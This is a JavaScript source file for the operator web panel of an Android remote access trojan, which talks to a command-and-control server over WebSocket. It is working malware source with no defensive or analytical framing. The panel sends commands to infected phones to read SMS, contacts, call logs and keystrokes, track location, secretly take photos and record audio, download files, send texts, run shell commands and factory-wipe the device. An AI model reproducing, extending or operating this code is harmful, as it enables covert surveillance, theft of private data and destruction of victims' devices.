/**
 * RAT Web Panel — Controller
 * Connects to C2 server via WebSocket (/ws/controller path)
 */

const C2_HOST = window.location.hostname;
const C2_PORT = window.location.port || 8080;
const WS_URL  = `ws://${C2_HOST}:${C2_PORT}/ws/controller`;

let ws              = null;
let selectedDevice  = null;
let reconnectTimer  = null;

// ── WebSocket ──────────────────────────────────────────────────────────────
function connect() {
    ws = new WebSocket(WS_URL);

    ws.onopen = () => {
        setStatus(true);
        clearTimeout(reconnectTimer);
    };

    ws.onclose = () => {
        setStatus(false);
        reconnectTimer = setTimeout(connect, 4000);
    };

    ws.onerror = () => {};

    ws.onmessage = ({ data }) => {
        try { handleMessage(JSON.parse(data)); }
        catch(e) { console.warn('parse err', e); }
    };
}

function sendWS(obj) {
    if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify(obj));
    }
}

// ── Message handler ────────────────────────────────────────────────────────
function handleMessage(msg) {
    switch (msg.type) {
        case 'snapshot':
            msg.devices.forEach(d => upsertDevice(d.id, d.info, d.connectedAt));
            break;
        case 'device_online':
            upsertDevice(msg.id, msg.info, new Date().toISOString());
            break;
        case 'device_offline':
            removeDevice(msg.id);
            break;
        case 'response':
            handleResponse(msg);
            break;
        case 'error':
            appendShell(`[ERROR: ${msg.command}] ${msg.error}`);
            break;
    }
}

function handleResponse(msg) {
    if (!msg.device_id || msg.device_id !== selectedDevice) return;
    const cmd  = msg.command;
    const data = msg.data;

    if (cmd === 'get_sms')           renderTable('sms-output',     data, ['address','type','date','body']);
    if (cmd === 'get_contacts')      renderTable('contacts-output', data, ['name','number']);
    if (cmd === 'get_calls')         renderTable('calls-output',    data, ['name','number','type','duration','date']);
    if (cmd === 'get_apps')          renderTable('apps-output',     data, ['name','package']);
    if (cmd === 'get_location')      renderLocation(data);
    if (cmd === 'take_photo')        renderPhoto(data);
    if (cmd === 'stop_recording')    renderAudio(data);
    if (cmd === 'get_keylog')        { document.getElementById('keylog-output').textContent += data + '\n'; }
    if (cmd === 'get_notifications') { document.getElementById('notif-output').textContent += (Array.isArray(data) ? data.join('\n') : data) + '\n'; }
    if (cmd === 'get_device_info')   renderDeviceInfo(data);
    if (cmd === 'get_files')         renderFiles(data);

    // Generic shell responses
    if (!['get_sms','get_contacts','get_calls','get_location','take_photo',
          'stop_recording','get_keylog','get_notifications','get_device_info',
          'get_files','get_apps'].includes(cmd)) {
        appendShell(`[${cmd}] ${typeof data === 'object' ? JSON.stringify(data,null,2) : data}`);
    }
}

// ── Device list ────────────────────────────────────────────────────────────
const deviceStore = {};

function upsertDevice(id, info, connectedAt) {
    deviceStore[id] = { id, info, connectedAt };
    renderDeviceList();
    updateDeviceCount();
}

function removeDevice(id) {
    delete deviceStore[id];
    if (selectedDevice === id) { selectedDevice = null; showNoDevice(); }
    renderDeviceList();
    updateDeviceCount();
}

function renderDeviceList() {
    const list = document.getElementById('device-list');
    list.innerHTML = '';
    Object.values(deviceStore).forEach(d => {
        const el = document.createElement('div');
        el.className = 'device-item' + (d.id === selectedDevice ? ' active' : '');
        el.innerHTML = `
            <div class="model"><span class="dot"></span>${(d.info && d.info.model) || 'Unknown'}</div>
            <div class="android">${(d.info && d.info.manufacturer) || ''} · Android ${(d.info && d.info.android) || '?'}</div>
            <div class="android" style="margin-top:2px;font-size:10px;opacity:.6">${d.id.substring(0,12)}...</div>
        `;
        el.onclick = () => selectDevice(d.id);
        list.appendChild(el);
    });
}

function updateDeviceCount() {
    document.getElementById('dcount').textContent = Object.keys(deviceStore).length;
}

function selectDevice(id) {
    selectedDevice = id;
    renderDeviceList();
    const d = deviceStore[id];
    if (d) {
        document.getElementById('dev-title').textContent =
            (d.info && d.info.model) || 'Unknown Device';
        document.getElementById('dev-subtitle').textContent =
            `${(d.info && d.info.manufacturer) || ''} · Android ${(d.info && d.info.android) || '?'} · ${id.substring(0,16)}`;
    }
    document.getElementById('no-device').style.display    = 'none';
    document.getElementById('device-panel').style.display = 'flex';
}

function showNoDevice() {
    document.getElementById('no-device').style.display    = '';
    document.getElementById('device-panel').style.display = 'none';
}

// ── Commands ───────────────────────────────────────────────────────────────
window.sendCmd = function(command, params) {
    if (!selectedDevice) return alert('Select a device first.');
    sendWS({ type: 'command', device_id: selectedDevice, command, params: params || {} });
};

window.sendSMS = function() {
    const number  = document.getElementById('sms-to').value.trim();
    const message = document.getElementById('sms-body').value.trim();
    if (!number || !message) return alert('Enter number and message.');
    sendCmd('send_sms', { number, message });
};

window.listFiles = function() {
    const path = document.getElementById('file-path').value.trim() || '/sdcard';
    sendCmd('get_files', { path });
};

window.runShell = function() {
    const cmd = document.getElementById('shell-cmd').value.trim();
    if (!cmd) return;
    sendCmd(cmd);
    appendShell('> ' + cmd);
    document.getElementById('shell-cmd').value = '';
};

window.confirmWipe = function() {
    if (confirm('Send factory reset command? This cannot be undone.')) {
        sendCmd('wipe_device');
    }
};

// ── Renderers ──────────────────────────────────────────────────────────────
function renderTable(elId, rows, cols) {
    const el = document.getElementById(elId);
    if (!Array.isArray(rows) || rows.length === 0) {
        el.innerHTML = '<p style="padding:16px;color:var(--muted)">No data.</p>';
        return;
    }
    let h = `<table><thead><tr>${cols.map(c=>`<th>${c}</th>`).join('')}</tr></thead><tbody>`;
    rows.forEach(r => {
        h += `<tr>${cols.map(c=>`<td>${r[c]||''}</td>`).join('')}</tr>`;
    });
    h += '</tbody></table>';
    el.innerHTML = h;
}

function renderLocation(data) {
    const el = document.getElementById('location-output');
    if (!data || data.error) {
        el.innerHTML = `<p style="padding:16px;color:var(--danger)">${(data && data.error) || 'Failed to get location'}</p>`;
        return;
    }
    el.innerHTML = `
        <div class="loc-card">
            <div class="loc-row"><span class="loc-key">Latitude</span><span>${data.latitude}</span></div>
            <div class="loc-row"><span class="loc-key">Longitude</span><span>${data.longitude}</span></div>
            <div class="loc-row"><span class="loc-key">Accuracy</span><span>${data.accuracy}m</span></div>
            <div class="loc-row"><span class="loc-key">Altitude</span><span>${data.altitude}m</span></div>
            <div class="loc-row"><span class="loc-key">Provider</span><span>${data.provider}</span></div>
            <a class="maps-link" href="${data.maps_link}" target="_blank">📍 Open in Google Maps →</a>
        </div>`;
}

function renderPhoto(b64) {
    const el = document.getElementById('camera-output');
    if (!b64 || b64.startsWith('error')) {
        el.innerHTML += `<p style="color:var(--danger)">Camera error: ${b64}</p>`;
        return;
    }
    const ts = new Date().toLocaleTimeString();
    const card = document.createElement('div');
    card.className = 'photo-card';
    card.innerHTML = `<img src="data:image/jpeg;base64,${b64}" alt="photo">
                      <div class="photo-meta">Captured at ${ts}</div>`;
    el.prepend(card);
}

function renderAudio(b64) {
    const el = document.getElementById('mic-output');
    if (!b64 || b64 === 'not_recording') {
        el.innerHTML += `<p style="color:var(--muted)">No active recording.</p>`;
        return;
    }
    const ts = new Date().toLocaleTimeString();
    const card = document.createElement('div');
    card.className = 'audio-card';
    card.innerHTML = `<div style="font-size:12px;color:var(--muted)">Recording — ${ts}</div>
                      <audio controls src="data:audio/mp4;base64,${b64}"></audio>`;
    el.prepend(card);
}

function renderFiles(files) {
    const el = document.getElementById('files-output');
    if (!Array.isArray(files) || files.length === 0) {
        el.innerHTML = '<p style="padding:16px;color:var(--muted)">Empty directory.</p>';
        return;
    }
    let h = `<table><thead><tr><th>Name</th><th>Type</th><th>Size</th><th>Action</th></tr></thead><tbody>`;
    files.forEach(f => {
        const icon = f.type === 'dir' ? '📁' : '📄';
        const dl = f.type === 'file' && f.readable === 'true'
            ? `<button class="btn" onclick="sendCmd('download_file',{path:'${f.path}'})">⬇ DL</button>`
            : '';
        const nav = f.type === 'dir'
            ? `<button class="btn" onclick="document.getElementById('file-path').value='${f.path}';listFiles()">Open</button>`
            : '';
        h += `<tr><td>${icon} ${f.name||''}</td><td>${f.type||''}</td><td>${formatBytes(parseInt(f.size)||0)}</td><td>${nav}${dl}</td></tr>`;
    });
    h += '</tbody></table>';
    el.innerHTML = h;
}

function renderDeviceInfo(info) {
    if (!info) return;
    appendShell(JSON.stringify(info, null, 2));
    switchTab('shell');
}

function appendShell(text) {
    const el = document.getElementById('shell-output');
    el.textContent += text + '\n';
    el.scrollTop = el.scrollHeight;
}

// ── Tabs ───────────────────────────────────────────────────────────────────
document.querySelectorAll('.tab').forEach(btn => {
    btn.addEventListener('click', () => switchTab(btn.dataset.tab));
});

function switchTab(name) {
    document.querySelectorAll('.tab').forEach(b => b.classList.remove('active'));
    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
    const btn = document.querySelector(`.tab[data-tab="${name}"]`);
    const content = document.getElementById(`tab-${name}`);
    if (btn) btn.classList.add('active');
    if (content) content.classList.add('active');
}

// ── Utils ──────────────────────────────────────────────────────────────────
function setStatus(online) {
    const el = document.getElementById('conn-status');
    el.textContent = online ? '●  Online' : '●  Offline';
    el.className   = 'badge ' + (online ? 'online' : 'offline');
}

function formatBytes(b) {
    if (b < 1024) return b + ' B';
    if (b < 1048576) return (b/1024).toFixed(1) + ' KB';
    return (b/1048576).toFixed(1) + ' MB';
}

// ── Init ───────────────────────────────────────────────────────────────────
connect();
